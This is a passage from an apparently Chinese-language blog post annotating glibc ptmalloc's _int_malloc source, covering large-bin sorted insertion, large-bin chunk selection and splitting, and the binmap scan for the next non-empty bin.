punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//是否属于main_arena</span>                  <span class="token punctuation">}</span>                    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>                  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>                  <span class="token punctuation">.</span><span class="token punctuation">.</span>                  <span class="token keyword">else</span>                victim<span class="token operator">-></span>fd_nextsize <span class="token operator">=</span> victim<span class="token operator">-></span>bk_nextsize <span class="token operator">=</span> victim<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//如果largebins没有chunk，则fd_nextsize和bk_nextsize都指向自己</span>                <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>                <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>                <span class="token punctuation">.</span><span class="token punctuation">.</span>          <span class="token function">mark_bin</span> <span class="token punctuation">(</span>av<span class="token punctuation">,</span> victim_index<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">/*插入对应largebins，并作为第一个*/</span>          victim<span class="token operator">-></span>bk <span class="token operator">=</span> bck<span class="token punctuation">;</span>            victim<span class="token operator">-></span>fd <span class="token operator">=</span> fwd<span class="token punctuation">;</span>          fwd<span class="token operator">-></span>bk <span class="token operator">=</span> victim<span class="token punctuation">;</span>          bck<span class="token operator">-></span>fd <span class="token operator">=</span> victim<span class="token punctuation">;</span></code></pre><h4 id="如果有chunk，且victim是最小的"><a href="#如果有chunk，且victim是最小的" class="headerlink" title="如果有chunk，且victim是最小的"></a>如果有chunk，且victim是最小的</h4><pre class=" language-c"><code class="language-c">              <span class="token comment" spellcheck="true">/* maintain large bins in sorted order */</span>              <span class="token keyword">if</span> <span class="token punctuation">(</span>fwd <span class="token operator">!=</span> bck<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//存在chunk</span>                <span class="token punctuation">{</span>                  <span class="token comment" spellcheck="true">/* Or with inuse bit to speed comparisons */</span>                  size <span class="token operator">|</span><span class="token operator">=</span> PREV_INUSE<span class="token punctuation">;</span>                  <span class="token comment" spellcheck="true">/* if smaller than smallest, bypass loop below */</span>                  <span class="token function">assert</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>bck<span class="token operator">-></span>bk<span class="token operator">-></span>size <span class="token operator">&amp;</span> NON_MAIN_ARENA<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//属于main_arena</span>                  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>size<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>bck<span class="token operator">-></span>bk<span class="token operator">-></span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//bck->bk bin中最后一个chunk也是largbin中最小的chunk</span>                    <span class="token punctuation">{</span>                      fwd <span class="token operator">=</span> bck<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//表头</span>                      bck <span class="token operator">=</span> bck<span class="token operator">-></span>bk<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//指向最min_chunk</span>                      victim<span class="token operator">-></span>fd_nextsize <span class="token operator">=</span> fwd<span class="token operator">-></span>fd<span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//victim->fd_nextsize指向bin中第一个chunk</span>                      victim<span class="token operator">-></span>bk_nextsize <span class="token operator">=</span> fwd<span class="token operator">-></span>fd<span class="token operator">-></span>bk_nextsize<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//victim->bk_nextsize指向原min_chunk</span>                      fwd<span class="token operator">-></span>fd<span class="token operator">-></span>bk_nextsize <span class="token operator">=</span> victim<span class="token operator">-></span>bk_nextsize<span class="token operator">-></span>fd_nextsize <span class="token operator">=</span> victim<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//原max_chunk的bk_nextsize 指向victim</span>                    <span class="token punctuation">}</span>             <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>             <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>             <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>          <span class="token comment" spellcheck="true">/*插入最后的位置，恢复链接*/</span>             <span class="token function">mark_bin</span> <span class="token punctuation">(</span>av<span class="token punctuation">,</span> victim_index<span class="token punctuation">)</span><span class="token punctuation">;</span>          victim<span class="token operator">-></span>bk <span class="token operator">=</span> bck<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//victim->bk指向原min</span>          victim<span class="token operator">-></span>fd <span class="token operator">=</span> fwd<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//fd指向表头</span>          fwd<span class="token operator">-></span>bk <span class="token operator">=</span> victim<span class="token punctuation">;</span>            bck<span class="token operator">-></span>fd <span class="token operator">=</span> victim<span class="token punctuation">;</span>                                  </code></pre><h4 id="有chunk，但victim不是最小的"><a href="#有chunk，但victim不是最小的" class="headerlink" title="有chunk，但victim不是最小的"></a>有chunk，但victim不是最小的</h4><pre class=" language-c"><code class="language-c">                    <span class="token punctuation">{</span>                      <span class="token function">assert</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>fwd<span class="token operator">-></span>size <span class="token operator">&amp;</span> NON_MAIN_ARENA<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                      <span class="token comment" spellcheck="true">/*循环寻找size的合使位置*/</span>                      <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> size <span class="token operator">&lt;</span> fwd<span class="token operator">-></span>size<span class="token punctuation">)</span>                        <span class="token punctuation">{</span>                          fwd <span class="token operator">=</span> fwd<span class="token operator">-></span>fd_nextsize<span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//更新下一个fwd</span>                          <span class="token function">assert</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>fwd<span class="token operator">-></span>size <span class="token operator">&amp;</span> NON_MAIN_ARENA<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//属于main_arena</span>                        <span class="token punctuation">}</span>                        <span class="token comment" spellcheck="true">/*如果能有幸找到完全一样的size，直接插入该chunk后*/</span>                      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> size <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> fwd<span class="token operator">-></span>size<span class="token punctuation">)</span>                        <span class="token comment" spellcheck="true">/* Always insert in the second position.  */</span>                        fwd <span class="token operator">=</span> fwd<span class="token operator">-></span>fd<span class="token punctuation">;</span>                        <span class="token comment" spellcheck="true">/*没一样的size就建立nextsize链接*/</span>                      <span class="token keyword">else</span>                        <span class="token punctuation">{</span>                            <span class="token comment" spellcheck="true">/*其实是一个宏观的双向链表插入操作*/</span>                          victim<span class="token operator">-></span>fd_nextsize <span class="token operator">=</span> fwd<span class="token punctuation">;</span>                          victim<span class="token operator">-></span>bk_nextsize <span class="token operator">=</span> fwd<span class="token operator">-></span>bk_nextsize<span class="token punctuation">;</span>                          fwd<span class="token operator">-></span>bk_nextsize <span class="token operator">=</span> victim<span class="token punctuation">;</span>                          victim<span class="token operator">-></span>bk_nextsize<span class="token operator">-></span>fd_nextsize <span class="token operator">=</span> victim<span class="token punctuation">;</span>                        <span class="token punctuation">}</span>                      bck <span class="token operator">=</span> fwd<span class="token operator">-></span>bk<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//前一个chunk</span>                    <span class="token punctuation">}</span>                    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>                    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>                    <span class="token punctuation">.</span><span class="token punctuation">.</span>           <span class="token comment" spellcheck="true">/*双向链表插入操作  */</span>              <span class="token function">mark_bin</span> <span class="token punctuation">(</span>av<span class="token punctuation">,</span> victim_index<span class="token punctuation">)</span><span class="token punctuation">;</span>          victim<span class="token operator">-></span>bk <span class="token operator">=</span> bck<span class="token punctuation">;</span>            victim<span class="token operator">-></span>fd <span class="token operator">=</span> fwd<span class="token punctuation">;</span>          fwd<span class="token operator">-></span>bk <span class="token operator">=</span> victim<span class="token punctuation">;</span>          bck<span class="token operator">-></span>fd <span class="token operator">=</span> victim<span class="token punctuation">;</span>                   </code></pre><p>这个从unsortedbin中提取chunk的操作会最多循环1000次</p><h2 id="再次进行chunk提取"><a href="#再次进行chunk提取" class="headerlink" title="再次进行chunk提取"></a>再次进行chunk提取</h2><h3 id="先尝试largebin提取"><a href="#先尝试largebin提取" class="headerlink" title="先尝试largebin提取"></a>先尝试largebin提取</h3><pre class=" language-c"><code class="language-c">      <span class="token comment" spellcheck="true">/*在largebins中提取*/</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_smallbin_range</span> <span class="token punctuation">(</span>nb<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>          bin <span class="token operator">=</span> <span class="token function">bin_at</span> <span class="token punctuation">(</span>av<span class="token punctuation">,</span> idx<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//获取表头</span>          <span class="token comment" spellcheck="true">/* skip scan if empty or largest chunk is too small */</span>          <span class="token comment" spellcheck="true">/*bin有chunk，并且有足够大chunk*/</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>victim <span class="token operator">=</span> <span class="token function">first</span> <span class="token punctuation">(</span>bin<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> bin <span class="token operator">&amp;&amp;</span>              <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>victim<span class="token operator">-></span>size<span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>nb<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>      <span class="token comment" spellcheck="true">//first(bin)->size是最大的</span>              victim <span class="token operator">=</span> victim<span class="token operator">-></span>bk_nextsize<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//反向遍历，从最小开始</span>              <span class="token comment" spellcheck="true">/*遍历寻找第一个足够大的chunk*/</span>              <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>size <span class="token operator">=</span> <span class="token function">chunksize</span> <span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span>                      <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>nb<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                victim <span class="token operator">=</span> victim<span class="token operator">-></span>bk_nextsize<span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//指针更新</span>              <span class="token comment" spellcheck="true">/* Avoid removing the first entry for a size so that the skip                 list does not have to be rerouted.  */</span>                 <span class="token comment" spellcheck="true">/*1取到的chunk不是bin中的最后一个chunk 2该chunk与下一个chunk大小相等*/</span>              <span class="token keyword">if</span> <span class="token punctuation">(</span>victim <span class="token operator">!=</span> <span class="token function">last</span> <span class="token punctuation">(</span>bin<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> victim<span class="token operator">-></span>size <span class="token operator">==</span> victim<span class="token operator">-></span>fd<span class="token operator">-></span>size<span class="token punctuation">)</span>                victim <span class="token operator">=</span> victim<span class="token operator">-></span>fd<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//取该nextsize的下一个chunk，因为第一个chunk存放了nextsize，取出比较麻烦</span>              remainder_size <span class="token operator">=</span> size <span class="token operator">-</span> nb<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//计算切割后的size，即lastremainder</span>              <span class="token function">unlink</span> <span class="token punctuation">(</span>av<span class="token punctuation">,</span> victim<span class="token punctuation">,</span> bck<span class="token punctuation">,</span> fwd<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//unlink操作</span>              <span class="token comment" spellcheck="true">/* Exhaust */</span>              <span class="token comment" spellcheck="true">/*如果remainder不能单独成chunk*/</span>              <span class="token keyword">if</span> <span class="token punctuation">(</span>remainder_size <span class="token operator">&lt;</span> MINSIZE<span class="token punctuation">)</span>                <span class="token punctuation">{</span>                  <span class="token function">set_inuse_bit_at_offset</span> <span class="token punctuation">(</span>victim<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//置1物理相邻下一个chunk的inuse位物理相邻下一个chunk的inuse位</span>                  <span class="token keyword">if</span> <span class="token punctuation">(</span>av <span class="token operator">!=</span> <span class="token operator">&amp;</span>main_arena<span class="token punctuation">)</span>                    victim<span class="token operator">-></span>size <span class="token operator">|</span><span class="token operator">=</span> NON_MAIN_ARENA<span class="token punctuation">;</span>                <span class="token punctuation">}</span>              <span class="token keyword">else</span>                <span class="token punctuation">{</span>                  remainder <span class="token operator">=</span> <span class="token function">chunk_at_offset</span> <span class="token punctuation">(</span>victim<span class="token punctuation">,</span> nb<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//截取剩下的部分，视为remainder</span>                  <span class="token comment" spellcheck="true">/* We cannot assume the unsorted list is empty and therefore                     have to perform a complete insert here.  */</span>                  bck <span class="token operator">=</span> <span class="token function">unsorted_chunks</span> <span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//获取unsortedbin表头</span>                  fwd <span class="token operator">=</span> bck<span class="token operator">-></span>fd<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//第一个chunk</span>                   <span class="token comment" spellcheck="true">/*判断unsortedbin是否被破坏*/</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__glibc_unlikely</span> <span class="token punctuation">(</span>fwd<span class="token operator">-></span>bk <span class="token operator">!=</span> bck<span class="token punctuation">)</span><span class="token punctuation">)</span>                      <span class="token punctuation">{</span>                      errstr <span class="token operator">=</span> <span class="token string">"malloc(): corrupted unsorted chunks"</span><span class="token punctuation">;</span>                      <span class="token keyword">goto</span> errout<span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    <span class="token comment" spellcheck="true">/*双向链表插入unsortedbin*/</span>                  remainder<span class="token operator">-></span>bk <span class="token operator">=</span> bck<span class="token punctuation">;</span>                    remainder<span class="token operator">-></span>fd <span class="token operator">=</span> fwd<span class="token punctuation">;</span>                  bck<span class="token operator">-></span>fd <span class="token operator">=</span> remainder<span class="token punctuation">;</span>                  fwd<span class="token operator">-></span>bk <span class="token operator">=</span> remainder<span class="token punctuation">;</span>                  <span class="token comment" spellcheck="true">/*如果不处于smallbins范围*/</span>                  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_smallbin_range</span> <span class="token punctuation">(</span>remainder_size<span class="token punctuation">)</span><span class="token punctuation">)</span>                    <span class="token punctuation">{</span>                      remainder<span class="token operator">-></span>fd_nextsize <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>                      remainder<span class="token operator">-></span>bk_nextsize <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    <span class="token comment" spellcheck="true">/*设置victim的size字段*/</span>                  <span class="token function">set_head</span> <span class="token punctuation">(</span>victim<span class="token punctuation">,</span> nb <span class="token operator">|</span> PREV_INUSE <span class="token operator">|</span>                            <span class="token punctuation">(</span>av <span class="token operator">!=</span> <span class="token operator">&amp;</span>main_arena <span class="token operator">?</span> NON_MAIN_ARENA <span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token comment" spellcheck="true">/*设置remainder的size字段*/</span>                  <span class="token function">set_head</span> <span class="token punctuation">(</span>remainder<span class="token punctuation">,</span> remainder_size <span class="token operator">|</span> PREV_INUSE<span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token comment" spellcheck="true">/*设置remainder物理相邻的下一个chunk的prev_size为remainder_size*/</span>                  <span class="token function">set_foot</span> <span class="token punctuation">(</span>remainder<span class="token punctuation">,</span> remainder_size<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>              <span class="token function">check_malloced_chunk</span> <span class="token punctuation">(</span>av<span class="token punctuation">,</span> victim<span class="token punctuation">,</span> nb<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token keyword">void</span> <span class="token operator">*</span>p <span class="token operator">=</span> <span class="token function">chunk2mem</span> <span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//指针转换</span>              <span class="token function">alloc_perturb</span> <span class="token punctuation">(</span>p<span class="token punctuation">,</span> bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token keyword">return</span> p<span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//用户地址返回</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span></code></pre><h3 id="如果还没找到"><a href="#如果还没找到" class="headerlink" title="如果还没找到"></a>如果还没找到</h3><pre class=" language-c"><code class="language-c">      <span class="token operator">++</span>idx<span class="token punctuation">;</span>      bin <span class="token operator">=</span> <span class="token function">bin_at</span> <span class="token punctuation">(</span>av<span class="token punctuation">,</span> idx<span class="token punctuation">)</span><span class="token punctuation">;</span>      block <span class="token operator">=</span> <span class="token function">idx2block</span> <span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">;</span>      map <span class="token operator">=</span> av<span class="token operator">-></span>binmap<span class="token punctuation">[</span>block<span class="token punctuation">]</span><span class="token punctuation">;</span>      bit <span class="token operator">=</span> <span class="token function">idx2bit</span> <span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token punctuation">;</span> <span class="token punctuation">)</span>        <span class="token punctuation">{</span>          <span class="token comment" spellcheck="true">/* Skip rest of block if there are no more set bits in this block.  */</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>bit <span class="token operator">></span> map <span class="token operator">||</span> bit <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>              <span class="token keyword">do</span>                <span class="token punctuation">{</span>                  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">++</span>block <span class="token operator">>=</span> BINMAPSIZE<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">/* out of bins */</span>                    <span class="token keyword">goto</span> use_top<span class="token punctuation">;</span>                <span class="token punctuation">}</span>              <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>map <span class="token operator">=</span> av<span class="token operator">-></span>binmap<span class="token punctuation">[</span>block<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              bin <span class="token operator">=</span> <span class="token function">bin_at</span> <span class="token punctuation">(</span>av<span class="token punctuation">,</span> <span class="token punctuation">(</span>block <span class="token operator">&lt;&lt;</span> BINMAPSHIFT<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              bit <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>          <span class="token comment" spellcheck="true">/* Advance to bin with set bit. There must be one. */</span>          <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>bit <span class="token operator">&amp;</span> map<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>              bin <span class="token operator">=</span> <span class="token function">next_bin</span> <span class="token punctuation">(</span>bin<span class="token punctuation">)</span><span class="token punctuation">;</span>              bit <span class="token operator">&lt;&lt;=</span> <span class="token number">1</span><span class="token punctuation">;</span>              <span class="token function">assert</span> <span class="token punctuation">(</span>bit <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>          <span class="token comment" spellcheck="true">/* Inspect the bin. It is likely to be non-empty */</span>          victim <span class="token operator">=</span> <span class="token function">last</span> <span class="token punctuation">(</span>bin<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment" spellcheck="true">/*  If a false alarm (empty bin), clear the bit. */</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>victim <span class="token operator">==</span> bin<span class="token punctuation">)</span>            <span class="token punctuation">{</span>              av<span class="token operator">-></span>binmap<span class="token punctuation">[</span>block<span class="token punctuation">]</span> <span class="token operator">=</span> map <span class="token operator">&amp;</span><span class="token operator">=</span> <span class="token operator">~</span>bit<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* Write through */</span>              bin <span class="token operator">=</span> <span class="token function">next_bin</span> <span class="token punctuation">(</span>bin<span class="token punctuation">)</span><span class="token punctuation">;</span>              bit <span class="token operator">&lt;&lt;=</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>          <span class="token keyword">else</span>            <span class="token punctuation">{</span>              size <span class="token operator">=</span> <span class="token function">chunksize</span> <span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token comment" spellcheck="true">/*  We know the first chunk in this bin is big enough to use. */</span>              <span class="token function">assert</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>size<span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>nb<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              remainder_size <span class="token operator">=</span> size <span class="token operator">-</span> nb<span class="token punctuation">;</span>              <span class="token comment" spellcheck="true">/* unlink */</span>              <span class="token function">unlink</span> <span class="token punctuation">(</span>av<span class="token punctuation">,</span> victim<span class="token punctuation">,</span> bck<span class="token punctuation">,</span> fwd<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token comment" spellcheck="true">/* Exhaust */</span>              <span class="token keyword">if</span> <span class="token punctuation">(</span>remainder_size <span class="token operator">&lt;</span> MINSIZE<span class="token punctuation">)</span>                <span class="token punctuation">{</span>                  <span class="token function">set_inuse_bit_at_offset</span> <span class="token punctuation">(</span>victim<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token keyword">if</span> <span class="token punctuation">(</span>av <span class="token operator">!=</span> <span class="token operator">&amp;</span>main_arena<span class="token punctuation">)</span>                    victim<span class="token operator">-></span>size <span class="token operator">|</span><span class="token operator">=</span> NON_MAIN_ARENA<span class="token punctuation">;</span>                <span class="token punctuation">}</span>              <span class="token comment" spellcheck="true">/* Split */</span>              <span class="token keyword">else</span>                <span class="token punctuation">{</span>                  remainder <span class="token operator">=</span> <span class="token function">chunk_at_offset</span> <span class="token punctuation">(</span>victim<span class="token punctuation">,</span> nb<span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token comment" spellcheck="true">/* We cannot assume the unsorted list is empty and therefore                     have to perform a complete insert here.  */</span>                  bck <span class="token operator">=</span> <span class="token function">unsorted_chunks</span> <span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token punctuation">;</span>                  fwd <span class="token operator">=</span> bck<span class="token operator">-></span>fd<span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__glibc_unlikely</span> <span class="token punctuation">(</span>fwd<span class="token operator">-></span>bk <span class="token operator">!=</span> bck<span class="token punctuation">)</span><span class="token punctuation">)</span>                    <span class="token punctuation">{</span>                      errstr <span class="token operator">=</span> <span class="token string">"malloc(): corrupted unsorted chunks 2"</span><span class="token punctuation">;</span>                      <span class="token keyword">goto</span> errout<span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                  remainder<span class="token operator">-></span>bk <span class="token operator">=</span> bck<span class="token punctuation">;</span>                  remainder<span class="token operator">-></span>fd <span class="token operator">=</span> fwd<span class="token punctuation">;</span>                  bck<span class="token operator">-></span>fd <span class="token operator">=</span> remainder<span class="token punctuation">;</span>                  fwd<span class="token operator">-></span>bk <span class="token operator">=</span> remainder<span class="token punctuation">;</span>                  <span class="token comment" spellcheck="true">/* advertise as last remainder */</span>                  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_smallbin_range</span> <span class="token punctuation">(</span>nb<span class="token punctuation">)</span><span class="token punctuation">)</span>                    av<span class="token operator">-></span>last_remainder <span class="token operator">=</span> remainder<span class="token punctuation">;</span>                  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_smallbin_range</span> <span class="token punctuation">(</span>remainder_size<span class="token punctuation">)</span><span class="token punctuation">)</span>                    <span class="token punctuation">{</span>                      remainder<span class="token operator">-></span>fd_nextsize <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>                      remainder<span class="token operator">-></span>bk_nextsize <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                  <span class="token function">set_head</span> <span class="token punctuation">(</span>victim<span class="token punctuation">,</span> nb <span class="token operator">|</span> PREV_INUSE <span class="token operator">|</span>                            <span class="token punctuation">(</span>av <span class="token operator">!=</span> <span class="token operator">&amp;</span>main_arena <span class="token operator">?</span> NON_MAIN_ARENA <span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token function">set_head</span> <span class="token punctuation">(</span>remainder<span class="token punctuation">,</span> remainder_size <span class="token operator">|</span> PREV_INUSE<span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token function">set_foot</span> <span class="token punctuation">(</span>remainder<span class="token punctuation">,</span> remainder_size<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>              <span class="token function">check_malloced_chunk</span> <span class="token punctuation">(</span>av<span class="token punctuation">,</span> victim<span class="token punctuation">,</span> nb<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token keyword">void</span> <span class="token operator">*</span>p <span class="token operator">=</span> <span class="token function">chunk2mem</span> <span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token function">alloc_perturb</span> <span class="token punctuation">(</span>p<span class="token punctuation">,</span> bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token keyword">return</span> p<span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span></code></pre><blockquote><p>这一部分的整体意思是，前面在<code>largebin</code>中寻找特定大小的空闲<code>chunk</code>，如果没找到，这里就要遍历<code>largebin</code>中的其他更大的<code>chunk</code>双向链表，继续寻找。<br>开头的<code>++idx</code>就表示，这里要从<code>largebin</code>中下一个更大的<code>chunk</code>双向链表开始遍历。<code>ptmalloc</code>中用一个<code>bit</code>表示<code>malloc_state</code>的<code>bins</code>数组中对应的位置上是否有空闲<code>chunk</code>，<code>bit</code>为1表示有，为0则没有。<code>ptmalloc</code>通过4个<code>block</code>（一个<code>block</code> 4字节）一共<code>128</code>个<code>bit</code>管理<code>bins</code>数组。因此，代码中计算的<code>block</code>表示对应的<code>idx</code>属于哪一个<code>block</code>，<code>map</code>就表是<code>block</code>对应的<code>bit</code>组成的二进制数字。<br>接下来进入<code>for</code>循环，如果<code>bit &gt; map</code>，表示该<code>map</code>对应的整个<code>block</code>里都没有大于<code>bit</code>位置的空闲的<code>chunk</code>，因此就要找下一个<code>block</code>。因为后面的<code>block</code>只要不等于0，就肯定有空闲<code>chunk</code>，并且其大小大于bit位置对应的chunk，下面就根据<code>block</code>，取出<code>block</code>对应的第一个双向链表的头指针。这里也可以看出，设置map和block也是为了加快查找的速度。如果遍历完所有<code>block</code>都没有空闲<code>chunk</code>，这时只能从<code>top 